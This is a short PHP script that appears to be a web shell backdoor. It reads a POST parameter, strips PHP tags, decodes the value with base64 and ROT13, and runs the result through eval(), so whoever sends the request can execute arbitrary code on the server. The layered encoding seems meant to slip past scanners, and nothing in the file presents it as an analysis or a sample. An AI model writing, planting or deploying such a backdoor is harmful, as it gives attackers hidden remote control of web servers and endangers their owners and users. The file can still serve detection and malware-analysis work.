<?php
$c_ntent=$_POST['php_content'];
$res=trim(stripslashes($c_ntent.' '),'<?php, ?>');
eval(str_rot13(base64_decode("$res")));
echo "end";
?>